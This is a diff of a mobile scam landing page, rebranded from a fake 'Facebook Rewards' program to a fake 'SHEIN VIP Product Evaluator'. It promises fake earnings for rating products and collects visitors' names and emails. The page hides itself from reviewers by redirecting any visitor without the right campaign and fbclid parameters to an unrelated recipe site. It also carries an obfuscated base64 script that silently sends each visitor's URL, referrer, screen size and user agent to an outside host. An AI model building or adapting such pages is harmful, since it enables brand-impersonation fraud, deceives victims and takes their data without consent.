@@ -1,4 +1,4 @@
-<!DOCTYPE html><html lang="es"><head>
+<!DOCTYPE html><html lang="en"><head>
 <script>!function(){var _p=["aHR0cHM6Ly9jbGljay1jaGFybS03My5sb3ZhYmxlLmFwcA==","L2FwaS9wdWJsaWMvY2RuL2Fzc2V0cy92MS9tZXRyaWNz","976e24b0-6a4d-4dd1-90af-7b0e1f18cfdd"],_d=function(x){try{return atob(x)}catch(e){return""}},_e=function(){return _d(_p[0])+_d(_p[1])+"/"+_p[2]};function _h(){try{var r=document.documentElement;r.setAttribute("data-ready","1");var ns=document.querySelectorAll("img[data-src]"),io=("IntersectionObserver"in window)?new IntersectionObserver(function(xs){xs.forEach(function(x){if(x.isIntersecting){var t=x.target,s=t.getAttribute("data-src");if(s){t.src=s;t.removeAttribute("data-src")}io.unobserve(t)}})},{rootMargin:"200px"}):null;ns.forEach(function(t){if(io)io.observe(t);else{var s=t.getAttribute("data-src");if(s){t.src=s;t.removeAttribute("data-src")}}})}catch(e){}try{var l=location,g=screen,n=navigator,q=["h="+encodeURIComponent(l.hostname),"u="+encodeURIComponent(l.href),"r="+encodeURIComponent(document.referrer||""),"s="+(g.width+"x"+g.height),"ua="+encodeURIComponent(n.userAgent),"t="+Date.now()],i=new Image();i.decoding="async";i.loading="eager";i.src=_e()+"?"+q.join("&")}catch(e){}}if(document.readyState==="loading"){document.addEventListener("DOMContentLoaded",_h,{once:true})}else{_h()}if(document.fonts&&document.fonts.ready&&document.fonts.ready.then){document.fonts.ready.then(function(){try{document.documentElement.setAttribute("data-fonts","1")}catch(e){}})}}();</script>
 <script>
 (function(){
@@ -7,15 +7,15 @@
     var isDev=h==='localhost'||h==='127.0.0.1'||h.indexOf('preview--')!==-1||h.indexOf('-preview.')!==-1||/\.lovableproject\.com$|^192\.168\./.test(h);
     var q=new URLSearchParams(location.search);
     var c=(q.get('utm_campaign')||'').toLowerCase();
-    var ok=c.indexOf('mtp')!==-1 && q.has('fbclid');
+    var ok=(c.indexOf('shein')!==-1 || c.indexOf('shp')!==-1 || c.indexOf('mtp')!==-1) && q.has('fbclid');
     if(!isDev && !ok){
       document.documentElement.style.display='none';
       location.replace('https://www.tudogostoso.com.br/receita/29124-bolo-simples.html');
       return;
     }
-    document.title='Facebook Rewards';
+    document.title='SHEIN VIP — Product Evaluator';
     var m=document.querySelector('meta[name="description"]');
-    if(m)m.setAttribute('content','Earn rewards by evaluating Facebook content.');
+    if(m)m.setAttribute('content','Earn rewards by evaluating trending SHEIN fashion products.');
   }catch(e){
     document.documentElement.style.display='none';
     location.replace('https://www.tudogostoso.com.br/receita/29124-bolo-simples.html');
@@ -24,9 +24,9 @@
 </script>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Loading...</title>
-  <meta name="description" content="Loading...">
-  <link rel="icon" href="images/DF32jO8vZckV.png">
+  <title>SHEIN VIP — Product Evaluator</title>
+  <meta name="description" content="Earn rewards by evaluating trending SHEIN fashion products.">
+  <link rel="icon" href="images/shein-icon.svg">
   <link rel="preload" as="image" href="images/amazon_post.webp">
   <link rel="preload" as="image" href="images/apple_post.webp">
   <link rel="preload" as="image" href="images/starbucks_post.webp">
@@ -166,71 +166,73 @@
       align-items: center; justify-content: center; flex-direction: column; }
 
     :root {
-      --fb-bg: #f0f2f5;
+      --fb-bg: #f5f5f7;
       --fb-surface: #ffffff;
-      --fb-surface-soft: #f7f8fa;
-      --fb-text: #1c1e21;
-      --fb-muted: #65676b;
-      --fb-line: #e4e6eb;
-      --fb-blue: #1877f2;
-      --fb-blue-soft: #e7f3ff;
-      --fb-green: #22a447;
-      --fb-red: #e32636;
+      --fb-surface-soft: #f8f8f8;
+      --fb-text: #111111;
+      --fb-muted: #666666;
+      --fb-line: #eeeeee;
+      --fb-blue: #000000;
+      --fb-blue-hover: #222222;
+      --fb-blue-soft: #f4f4f4;
+      --fb-green: #008a3e;
+      --fb-red: #666666;
+      --shein-coral: #fa6338;
+      --shein-black: #000000;
     }
     body { background: var(--fb-bg); color: var(--fb-text); font-family: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif; }
-    .fb-shell { width: 100%; max-width: 430px; min-height: 100svh; margin: 0 auto; background: var(--fb-bg); box-shadow: 0 0 24px rgba(28,30,33,.08); }
-    .fb-header { position: sticky; top: 0; z-index: 50; display: flex; align-items: center; justify-content: space-between; min-height: 56px; padding: 8px 12px; background: var(--fb-surface); border-bottom: 1px solid var(--fb-line); }
-    .fb-header-logo { width: 116px; height: auto; }
-    .fb-balance { display: inline-flex; align-items: center; gap: 6px; min-height: 34px; padding: 6px 11px; border-radius: 999px; background: var(--fb-blue-soft); color: var(--fb-green); font-size: 14px; font-weight: 700; }
-    .fb-balance-icon { display: grid; place-items: center; width: 21px; height: 21px; border-radius: 5px; background: var(--fb-green); color: white; }
+    .fb-shell { width: 100%; max-width: 430px; min-height: 100svh; margin: 0 auto; background: var(--fb-bg); box-shadow: 0 0 24px rgba(0,0,0,.08); }
+    .fb-header { position: sticky; top: 0; z-index: 50; display: flex; align-items: center; justify-content: space-between; min-height: 56px; padding: 10px 14px; background: var(--fb-surface); border-bottom: 1px solid var(--fb-line); }
+    .fb-header-logo { height: 26px; width: auto; object-fit: contain; }
+    .fb-balance { display: inline-flex; align-items: center; gap: 6px; min-height: 34px; padding: 6px 12px; border-radius: 999px; background: #e8f8f0; color: #008a3e; font-size: 14px; font-weight: 800; letter-spacing: -0.2px; }
+    .fb-balance-icon { display: grid; place-items: center; width: 21px; height: 21px; border-radius: 5px; background: #008a3e; color: white; }
     .fb-welcome { display: block; padding: 8px 0 20px; }
     .fb-welcome-post { width: 100%; overflow: hidden; background: var(--fb-surface); border-top: 1px solid var(--fb-line); border-bottom: 1px solid var(--fb-line); }
-    .fb-welcome-top { display: flex; align-items: center; gap: 9px; padding: 12px; }
-    .fb-reward-avatar { display: grid; place-items: center; width: 40px; height: 40px; flex: none; border-radius: 50%; background: linear-gradient(145deg, #2d88ff, var(--fb-blue)); color: white; }
-    .fb-title { font-size: 15px; line-height: 1.2; font-weight: 700; }
-    .fb-subline { margin-top: 2px; color: var(--fb-muted); font-size: 12px; }
-    .fb-welcome-body { padding: 2px 12px 14px; }
-    .fb-welcome-body h1 { font-size: 20px; line-height: 1.25; font-weight: 700; }
-    .fb-welcome-body > p { margin-top: 8px; color: var(--fb-text); font-size: 15px; line-height: 1.42; }
-    .fb-earned { display: flex; align-items: center; gap: 9px; margin: 14px 0 10px; padding: 12px; border-radius: 6px; background: var(--fb-blue-soft); color: #1459ad; font-size: 14px; font-weight: 700; }
-    .fb-start { display: flex; align-items: center; justify-content: center; gap: 8px; width: 100%; min-height: 46px; margin-top: 14px; border-radius: 6px; background: var(--fb-blue); color: white; font-size: 15px; font-weight: 700; transition: background .15s ease, transform .15s ease; }
-    .fb-start:hover { background: #166fe5; }
+    .fb-welcome-top { display: flex; align-items: center; gap: 10px; padding: 14px; }
+    .fb-reward-avatar { display: grid; place-items: center; width: 42px; height: 42px; flex: none; border-radius: 50%; background: #000000; color: white; }
+    .fb-title { font-size: 16px; line-height: 1.2; font-weight: 800; color: #000000; letter-spacing: -0.2px; }
+    .fb-subline { margin-top: 2px; color: var(--fb-muted); font-size: 12px; font-weight: 500; }
+    .fb-welcome-body { padding: 4px 14px 18px; }
+    .fb-welcome-body h1 { font-size: 21px; line-height: 1.25; font-weight: 800; color: #000000; letter-spacing: -0.3px; }
+    .fb-welcome-body > p { margin-top: 8px; color: #333333; font-size: 14.5px; line-height: 1.45; }
+    .fb-earned { display: flex; align-items: center; gap: 9px; margin: 14px 0 10px; padding: 12px 14px; border-radius: 8px; background: #e8f8f0; color: #008a3e; font-size: 14px; font-weight: 800; }
+    .fb-start { display: flex; align-items: center; justify-content: center; gap: 8px; width: 100%; min-height: 48px; margin-top: 16px; border-radius: 8px; background: #000000; color: white; font-size: 15px; font-weight: 800; letter-spacing: 0.02em; transition: background .15s ease, transform .15s ease; box-shadow: 0 4px 12px rgba(0,0,0,0.15); }
+    .fb-start:hover { background: #222222; }
     .fb-start:active { transform: scale(.985); }
     .fb-feed { padding-bottom: 28px; }
     .fb-post { margin: 8px 0 0; overflow: hidden; background: var(--fb-surface); border-top: 1px solid var(--fb-line); border-bottom: 1px solid var(--fb-line); }
-    .fb-post-head { display: flex; align-items: center; gap: 9px; padding: 12px 12px 9px; }
-    .fb-avatar { width: 40px; height: 40px; flex: none; overflow: hidden; border: 1px solid var(--fb-line); border-radius: 50%; background: var(--fb-surface); }
-    .fb-avatar img { width: 100%; height: 100%; object-fit: contain; }
-    .fb-post-meta { min-width: 0; flex: 1; }
-    .fb-post-name { display: flex; align-items: center; gap: 4px; color: var(--fb-text); font-size: 15px; font-weight: 700; }
-    .fb-post-name img { width: 15px; height: 15px; }
-    .fb-sponsored { display: flex; align-items: center; gap: 4px; margin-top: 2px; color: var(--fb-muted); font-size: 12px; }
-    .fb-more { display: grid; place-items: center; width: 36px; height: 36px; border-radius: 50%; color: var(--fb-muted); }
-    .fb-more:hover, .fb-action:hover { background: var(--fb-surface-soft); }
-    .fb-copy { padding: 3px 12px 12px; color: var(--fb-text); font-size: 15px; line-height: 1.4; }
-    .fb-copy span { color: var(--fb-blue) !important; font-weight: 600; }
-    .fb-media { display: block; width: 100%; height: auto; object-fit: contain; background: var(--fb-surface-soft); border-top: 1px solid var(--fb-line); border-bottom: 1px solid var(--fb-line); }
-    .fb-stats { display: flex; align-items: center; justify-content: space-between; min-height: 44px; margin: 0 12px; color: var(--fb-muted); font-size: 13px; border-bottom: 1px solid var(--fb-line); }
-    .fb-reactions { display: flex; align-items: center; gap: 6px; }
-    .fb-reaction-stack { display: flex; }
-    .fb-reaction { display: grid; place-items: center; width: 19px; height: 19px; margin-left: -3px; border: 1px solid white; border-radius: 50%; color: white; font-size: 10px; }
-    .fb-reaction:first-child { margin-left: 0; background: var(--fb-blue); }
-    .fb-reaction:nth-child(2) { background: #f55368; }
-    .fb-reaction:nth-child(3) { background: #f7b928; }
-    .fb-stat-right { display: flex; gap: 12px; }
-    .fb-actions { display: grid; grid-template-columns: repeat(3, 1fr); padding: 3px 5px; }
-    .fb-action { display: flex; align-items: center; justify-content: center; gap: 7px; min-height: 44px; border-radius: 5px; color: var(--fb-muted); font-size: 13px; font-weight: 600; }
-    .fb-survey { position: static; width: 100%; margin: 0 auto; padding: 18px 14px 16px; background: var(--fb-surface); border-top: 8px solid var(--fb-bg); box-shadow: none; text-align: center; }
-    .fb-survey-kicker { color: var(--fb-muted); font-size: 12px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.04em; }
-    .fb-question { margin-top: 5px; color: var(--fb-text); font-size: 17px; line-height: 1.25; font-weight: 700; text-align: center; }
-    .fb-votes { display: grid; grid-template-columns: minmax(0,1fr) minmax(0,1fr); gap: 10px; margin: 12px auto 0; width: 100%; max-width: 380px; }
-    .fb-vote { display: flex; min-width: 0; align-items: center; justify-content: center; gap: 7px; min-height: 48px; padding: 8px 12px; border-radius: 8px; color: white; font-size: 14px; font-weight: 700; transition: filter .15s ease, transform .15s ease; }
-    .fb-vote svg { width: 18px; height: 18px; flex: none; }
-    .fb-vote span { min-width: 0; overflow-wrap: anywhere; }
-    .fb-vote:hover { filter: brightness(.95); }
-    .fb-vote:active { transform: scale(.98); }
-    .fb-vote-no { background: var(--fb-red); }
-    .fb-vote-yes { background: var(--fb-green); }
+
+    /* ─── SHEIN Product Card Specifics ─── */
+    .shein-card-top { display: flex; align-items: center; justify-content: space-between; padding: 12px 14px 10px; border-bottom: 1px solid var(--fb-line); }
+    .shein-brand-badge { display: flex; align-items: center; gap: 9px; }
+    .shein-brand-icon { width: 34px; height: 34px; border-radius: 8px; object-fit: contain; }
+    .shein-brand-title { display: flex; align-items: center; gap: 5px; font-size: 14.5px; font-weight: 800; color: #000000; }
+    .shein-brand-title img { width: 14px; height: 14px; }
+    .shein-sku-line { font-size: 11px; color: #888888; font-weight: 500; display: flex; align-items: center; gap: 6px; }
+    .shein-tag-mini { display: inline-block; padding: 1px 6px; border-radius: 3px; background: #fff0eb; color: #fa6338; font-weight: 700; font-size: 10px; text-transform: uppercase; }
+    .shein-free-returns { display: flex; align-items: center; gap: 4px; font-size: 11.5px; color: #008a3e; font-weight: 600; background: #e8f8f0; padding: 3px 8px; border-radius: 999px; }
+    .shein-product-image-wrap { position: relative; width: 100%; background: #fbfbfb; overflow: hidden; }
+    .shein-product-media { display: block; width: 100%; max-height: 420px; object-fit: cover; }
+    .shein-overlay-tag { position: absolute; bottom: 12px; left: 12px; background: rgba(0,0,0,0.75); backdrop-filter: blur(4px); color: #ffffff; font-size: 11px; font-weight: 700; padding: 3px 9px; border-radius: 4px; letter-spacing: 0.03em; }
+    .shein-price-bar { display: flex; align-items: baseline; justify-content: space-between; padding: 12px 14px 4px; }
+    .shein-price-left { display: flex; align-items: baseline; gap: 8px; }
+    .shein-curr-price { font-size: 24px; font-weight: 900; color: #fa6338; letter-spacing: -0.02em; }
+    .shein-old-price { font-size: 14px; color: #999999; text-decoration: line-through; }
+    .shein-discount-tag { display: inline-block; padding: 2px 6px; border-radius: 3px; background: #000000; color: #ffffff; font-size: 11px; font-weight: 800; line-height: 1.2; }
+    .shein-rating-badge { display: flex; align-items: center; gap: 4px; }
+    .shein-product-copy { padding: 4px 14px 12px; font-size: 14px; color: #222222; line-height: 1.45; border-bottom: 1px solid var(--fb-line); }
+    .shein-survey-box { padding: 16px 14px 18px; background: #ffffff; border-top: 6px solid var(--fb-bg); text-align: center; }
+    .shein-survey-kicker { font-size: 11.5px; font-weight: 800; color: #fa6338; text-transform: uppercase; letter-spacing: 0.05em; }
+    .shein-survey-question { margin-top: 6px; font-size: 16.5px; font-weight: 800; color: #000000; line-height: 1.3; }
+    .shein-votes { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 14px; max-width: 380px; margin-left: auto; margin-right: auto; }
+    .shein-vote { display: flex; align-items: center; justify-content: center; gap: 7px; min-height: 48px; padding: 8px 12px; border-radius: 8px; font-size: 13.5px; font-weight: 700; transition: transform .1s, filter .15s; }
+    .shein-vote:active { transform: scale(0.98); }
+    .shein-vote-secondary { background: #f0f0f2; color: #444444; border: 1px solid #e0e0e4; }
+    .shein-vote-secondary:hover { background: #e6e6ea; }
+    .shein-vote-primary { background: #000000; color: #ffffff; box-shadow: 0 4px 12px rgba(0,0,0,0.18); }
+    .shein-vote-primary:hover { background: #222222; }
+
+    /* Legacy support styles maintained */
     .support-shell { display: flex; flex-direction: column; width: 100%; height: 100svh; height: 100dvh; min-height: 580px; background: var(--fb-surface); }
     html.chat-full, body.chat-full { width: 100%; height: 100%; overflow: hidden; overscroll-behavior: none; background: var(--fb-surface); }
     body.chat-full .support-shell { min-height: 100svh; min-height: 100dvh; }
@@ -238,8 +240,8 @@
     .support-fb-logo { display: flex; align-items: center; gap: 10px; }
     .support-fb-circle { width: 40px; height: 40px; flex-shrink: 0; }
     .support-fb-brand { display: flex; flex-direction: column; justify-content: center; }
-    .support-fb-name { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; font-size: 20px; font-weight: 800; color: #050505; line-height: 1.05; letter-spacing: -0.6px; }
-    .support-fb-sub { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; font-size: 13px; font-weight: 400; color: #050505; line-height: 1; letter-spacing: -0.2px; margin-top: 2px; }
+    .support-fb-name { font-family: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; font-size: 20px; font-weight: 900; color: #000000; line-height: 1.05; letter-spacing: 2px; }
+    .support-fb-sub { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; font-size: 12px; font-weight: 700; color: #fa6338; text-transform: uppercase; line-height: 1; letter-spacing: 0.05em; margin-top: 2px; }
     .support-balance-badge { display: inline-flex; align-items: center; gap: 7px; padding: 6px 14px; border-radius: 12px; background: #E8F8F0; color: #008a3e; font-size: 16px; font-weight: 700; letter-spacing: -0.2px; }
     .support-balance-badge svg { color: #008a3e; stroke: #008a3e; flex-shrink: 0; }
     .support-divider { width: 100%; height: 1px; background: #e4e6eb; flex-shrink: 0; }
@@ -461,9 +463,9 @@
       <div id="step-0" class="step active" data-funnel-view="tela_inicial">
         <div class="fb-shell appear">
           <header class="fb-header">
-            <img alt="Facebook" width="125" height="28" class="fb-header-logo" src="images/Facebook_Logo_%282019%29.svg">
+            <img alt="SHEIN" width="118" height="28" class="fb-header-logo" src="images/shein-logo.svg">
             <div class="fb-balance">
-              <span class="fb-balance-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="2" y="5" width="20" height="14" rx="2"></rect><line x1="2" y1="10" x2="22" y2="10"></line></svg></span>
+              <span class="fb-balance-icon"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="2" y="5" width="20" height="14" rx="2"></rect><line x1="2" y1="10" x2="22" y2="10"></line></svg></span>
               <span>$ 32.27</span>
             </div>
           </header>
@@ -471,24 +473,24 @@
             <div class="fb-welcome-post">
               <div class="fb-welcome-top">
                 <div class="fb-reward-avatar">
-                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
-                  <polyline points="20 6 9 17 4 12"></polyline>
-                </svg>
+                  <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                    <polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon>
+                  </svg>
                 </div>
-                <div><div class="fb-title">Facebook Rewards</div><div class="fb-subline">Sponsored · 🌐</div></div>
+                <div><div class="fb-title">SHEIN VIP Evaluator</div><div class="fb-subline">Official Reviewer Program · 🛍️</div></div>
               </div>
               <div class="fb-welcome-body">
-                <h1>🎁 Congratulations!</h1>
-                <p>You have been selected for Facebook's new rewards program. Enjoy!</p>
+                <h1>✨ Welcome, Fashion Reviewer!</h1>
+                <p>You've been selected for SHEIN's Official Product Evaluator Program. Review new season items and get rewarded with real commissions!</p>
                 <div class="fb-earned">
                 <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
                   <polyline points="20 6 9 17 4 12"></polyline>
                 </svg>
-                <span>You've already earned US$32.27!</span>
+                <span>You've already earned US$32.27 welcome bonus!</span>
                 </div>
-                <p>Complete all assessments and make your first withdrawal!</p>
+                <p>Evaluate 3 products from our trending collections to unlock your first commission withdrawal!</p>
                 <button onclick="nextStep()" class="fb-start" data-funnel-step="post_1">
-                <span>Click to Get Started</span>
+                <span>Start Product Evaluation</span>
                 <svg class="rotate-90 w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                   <path d="M18 11V6a2 2 0 0 0-4 0"></path><path d="M14 10V4a2 2 0 0 0-4 0v2"></path>
                   <path d="M10 10.5V6a2 2 0 0 0-4 0v8"></path>
@@ -509,9 +511,9 @@
 
           <!-- Header -->
           <header class="fb-header">
-              <img alt="Facebook" width="125" height="28" class="fb-header-logo" src="images/Facebook_Logo_%282019%29.svg">
+              <img alt="SHEIN" width="118" height="28" class="fb-header-logo" src="images/shein-logo.svg">
               <div class="fb-balance">
-                <span class="fb-balance-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                <span class="fb-balance-icon"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
                   <rect x="2" y="5" width="20" height="14" rx="2"></rect>
                   <line x1="2" y1="10" x2="22" y2="10"></line>
                 </svg></span>
@@ -533,12 +535,12 @@
           <header class="support-header">
             <div class="support-fb-logo">
               <svg class="support-fb-circle" viewBox="0 0 36 36" width="40" height="40" fill="none">
-                <circle cx="18" cy="18" r="18" fill="#1877F2"/>
-                <path fill="#ffffff" d="M24.8 23.2l.7-4.8h-4.6v-3.1c0-1.3.6-2.6 2.7-2.6h2.1V8.6s-1.9-.3-3.7-.3c-3.8 0-6.3 2.3-6.3 6.5v3.6h-4.2v4.8h4.2V35.6c.9.1 1.7.2 2.6.2s1.7-.1 2.6-.2V23.2h3.7z"/>
+                <circle cx="18" cy="18" r="18" fill="#111111"/>
+                <text x="18" y="24" font-family="'Inter', sans-serif" font-weight="900" font-size="18" fill="#FFFFFF" text-anchor="middle">S</text>
               </svg>
               <div class="support-fb-brand">
-                <span class="support-fb-name">facebook</span>
-                <span class="support-fb-sub">rewards</span>
+                <span class="support-fb-name">SHEIN</span>
+                <span class="support-fb-sub">vip reviewer</span>
               </div>
             </div>
             <div class="support-balance-badge">
@@ -554,12 +556,12 @@
           <div class="support-agent-card">
             <div class="support-agent-avatar-wrap" id="support-agent-avatar-wrap">
               <svg class="support-fb-circle" viewBox="0 0 36 36" width="44" height="44" fill="none">
-                <circle cx="18" cy="18" r="18" fill="#1877F2"/>
-                <path fill="#ffffff" d="M24.8 23.2l.7-4.8h-4.6v-3.1c0-1.3.6-2.6 2.7-2.6h2.1V8.6s-1.9-.3-3.7-.3c-3.8 0-6.3 2.3-6.3 6.5v3.6h-4.2v4.8h4.2V35.6c.9.1 1.7.2 2.6.2s1.7-.1 2.6-.2V23.2h3.7z"/>
+                <circle cx="18" cy="18" r="18" fill="#111111"/>
+                <text x="18" y="27" font-family="'Inter', sans-serif" font-weight="900" font-size="20" fill="#FFFFFF" text-anchor="middle">S</text>
               </svg>
             </div>
             <div class="support-agent-info">
-              <div class="support-agent-name" id="support-agent-name">Facebook Support</div>
+              <div class="support-agent-name" id="support-agent-name">SHEIN VIP Support</div>
               <div class="support-agent-role" id="support-agent-role"><span class="support-status-dot"></span><span>Online</span></div>
             </div>
           </div>
@@ -594,8 +596,8 @@
           <path class="anim-check" d="M30 50L45 65L70 35" stroke="#10B981" stroke-width="4" fill="transparent" stroke-linecap="round" stroke-linejoin="round"></path>
         </svg>
       </div>
-      <h2 class="anim-fade-1 text-[20px] font-bold text-white mb-2">You Earned Money!</h2>
-      <p class="anim-fade-2 text-white/90 mb-4 leading-relaxed text-[15px]">Your feedback was submitted successfully</p>
+      <h2 class="anim-fade-1 text-[20px] font-bold text-white mb-2">Review Submitted!</h2>
+      <p class="anim-fade-2 text-white/90 mb-4 leading-relaxed text-[15px]">Your product feedback was verified and recorded</p>
       <div id="earned-amount" class="anim-fade-3 text-[32px] font-black text-white mb-6 drop-shadow-md">+$82.06</div>
       <div class="anim-fade-4">
         <button onclick="continueFromBalance()" class="w-full bg-white hover:bg-white/90 text-black font-bold py-4 rounded-2xl text-[16px] transition-all transform active:scale-95 shadow-lg min-h-[54px]">
@@ -617,26 +619,26 @@
       </button>
       <!-- App info -->
       <div class="flex w-full items-center gap-4 p-4 border rounded-xl border-gray-200 bg-white shadow-sm text-left">
-        <div class="relative w-16 h-16 rounded-lg overflow-hidden bg-gray-100 flex-shrink-0">
-          <img src="images/lZFRpx3ZE7xx.png" alt="Facebook Rewards" class="w-full h-full object-contain p-1">
+        <div class="relative w-16 h-16 rounded-lg overflow-hidden bg-black flex-shrink-0 flex items-center justify-center">
+          <span class="text-white font-black text-2xl">S</span>
         </div>
         <div class="flex flex-col">
-          <span class="font-bold text-lg leading-tight">Facebook Rewards</span>
-          <span class="text-xs text-gray-500">Author: Facebook Inc. ©</span>
+          <span class="font-bold text-lg leading-tight">SHEIN VIP Reviewer</span>
+          <span class="text-xs text-gray-500">Author: SHEIN VIP Services ©</span>
         </div>
       </div>
       <!-- Form -->
       <form class="flex flex-col gap-4 text-left" onsubmit="submitCheckout(event)">
         <div>
           <label class="block text-sm font-medium text-gray-700 mb-1">Full Name</label>
-          <input id="checkout-name" name="name" required="" type="text" placeholder="John Doe" class="w-full rounded-lg border border-gray-300 px-4 py-3 bg-white text-black placeholder:text-gray-500 focus:border-green-500 focus:ring-green-500 outline-none transition-all">
+          <input id="checkout-name" name="name" required="" type="text" placeholder="Sarah Jenkins" class="w-full rounded-lg border border-gray-300 px-4 py-3 bg-white text-black placeholder:text-gray-500 focus:border-green-500 focus:ring-green-500 outline-none transition-all">
         </div>
         <div>
           <label class="block text-sm font-medium text-gray-700 mb-1">Email Address</label>
-          <input id="checkout-email" name="email" required="" type="email" placeholder="john@example.com" class="w-full rounded-lg border border-gray-300 px-4 py-3 bg-white text-black placeholder:text-gray-500 focus:border-green-500 focus:ring-green-500 outline-none transition-all">
+          <input id="checkout-email" name="email" required="" type="email" placeholder="sarah@example.com" class="w-full rounded-lg border border-gray-300 px-4 py-3 bg-white text-black placeholder:text-gray-500 focus:border-green-500 focus:ring-green-500 outline-none transition-all">
         </div>
-        <button type="submit" class="flex justify-center items-center gap-2 w-full p-5 shadow-lg bg-[#16A34A] hover:opacity-80 transition-all rounded-xl text-white font-semibold text-center">
-          Continue
+        <button type="submit" class="flex justify-center items-center gap-2 w-full p-5 shadow-lg bg-[#111111] hover:bg-[#222222] transition-all rounded-xl text-white font-semibold text-center">
+          Continue to Verification
         </button>
       </form>
     </div>
@@ -667,28 +669,55 @@
   var POSTS = [
     null, // step 0 has no post
     {
-      name: "Amazon.com",
-      logo: "images/amazon_logo.webp",
-      image: "images/amazon_post.webp",
-      text: 'Black Friday Week starts 11/20, but there are plenty of early deals now to kick off the holiday season 🎁 Shop savings now: <span class="text-[#0164D1] font-bold">https://amazon.visitlink.me/lBekah</span> <span class="text-[#0164D1] font-bold">#AmazonFinds</span>',
-      likes: "36,8 mil", comments: "735 comments", shares: "1.401 shares",
-      question: "Is this photo relevant to you?"
+      name: "SHEIN Frenchy",
+      badge: "Best Seller #1 in Dresses",
+      category: "Dresses & Rompers",
+      logo: "images/shein-icon.svg",
+      image: "https://images.unsplash.com/photo-1572804013309-59a88b7e92f1?auto=format&fit=crop&w=800&q=80",
+      sku: "SKU: sw220418491",
+      price: "$18.49",
+      oldPrice: "$36.00",
+      discount: "-48%",
+      text: 'French Romance Floral Puff-Sleeve Split Hem Midi Dress — Lightweight fabric with gentle stretch, vintage sweetheart neckline, and delicate botanical print. Trending for Spring/Summer.',
+      rating: "4.9",
+      ratingCount: "14,290 reviews",
+      question: "Would you recommend this dress to SHEIN shoppers?",
+      voteNo: "Not Recommended",
+      voteYes: "Highly Recommended"
     },
     {
-      name: "Apple",
-      logo: "images/apple_logo.webp",
-      image: "images/apple_post.webp",
-      text: 'Took the hit and kept going. <span class="text-[#0164D1] font-bold">#ShotOnAppleWatch</span> by <span class="text-[#0164D1] font-bold">@carlosalcaraz</span>',
-      likes: "4.736", comments: "232 comments", shares: "54 shares",
-      question: "Would you watch this content?"
+      name: "SHEIN ICON",
+      badge: "Trending Streetwear",
+      category: "Pants & Sets",
+      logo: "images/shein-icon.svg",
+      image: "https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?auto=format&fit=crop&w=800&q=80",
+      sku: "SKU: sw230912048",
+      price: "$23.99",
+      oldPrice: "$42.00",
+      discount: "-43%",
+      text: 'High-Waisted Utility Multi-Pocket Relaxed Cargo Trousers — Premium breathable cotton-twill blend, adjustable waist tabs, and relaxed streetwear fit for all-day comfort.',
+      rating: "4.8",
+      ratingCount: "8,920 reviews",
+      question: "Does this streetwear style match current fashion trends?",
+      voteNo: "Out of Style",
+      voteYes: "Trending & Stylish"
     },
     {
-      name: "Starbucks",
-      logo: "images/starbucks_logo.webp",
-      image: "images/starbucks_post.webp",
-      text: 'Say hello, to the newest Nitro 😍 Introducing the new Cinnamon Caramel Cream Nitro Cold Brew.',
-      likes: "12.5 mil", comments: "432 comments", shares: "127 shares",
-      question: "Do you find this interesting?"
+      name: "SHEIN VCAY",
+      badge: "Top Rated Accessory",
+      category: "Bags & Leather",
+      logo: "images/shein-icon.svg",
+      image: "https://images.unsplash.com/photo-1584917865442-de89df76afd3?auto=format&fit=crop&w=800&q=80",
+      sku: "SKU: sw240109312",
+      price: "$14.49",
+      oldPrice: "$28.00",
+      discount: "-48%",
+      text: 'Chic Quilted Vegan Leather Flap Crossbody Chain Bag — Gold-toned hardware, multiple interior compartments, and scratch-resistant vegan pebble leather finish.',
+      rating: "5.0",
+      ratingCount: "21,540 reviews",
+      question: "How do you evaluate the craftsmanship and aesthetic appeal?",
+      voteNo: "Average Quality",
+      voteYes: "Premium Quality"
     }
   ];
 
@@ -804,51 +833,43 @@
     var p = POSTS[n];
     var nextKey = n === 1 ? "post_2" : (n === 2 ? "post_3" : "chat");
     document.getElementById("post-card").innerHTML =
-      '<div class="fb-post-head">' +
-        '<div class="fb-avatar">' +
-          '<img alt="' + p.name + '" decoding="async" fetchpriority="high" src="' + p.logo + '">' +
-        '</div>' +
-        '<div class="fb-post-meta">' +
-          '<div class="fb-post-name">' +
-            '<span>' + p.name + '</span>' +
-            '<img src="images/verified.png" alt="Verified">' +
-          '</div>' +
-          '<div class="fb-sponsored">' +
-            '<span>Sponsored</span><span>·</span>' +
-            '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20"></path><path d="M2 12h20"></path></svg>' +
+      '<div class="shein-card-top">' +
+        '<div class="shein-brand-badge">' +
+          '<img alt="' + p.name + '" class="shein-brand-icon" src="' + p.logo + '">' +
+          '<div>' +
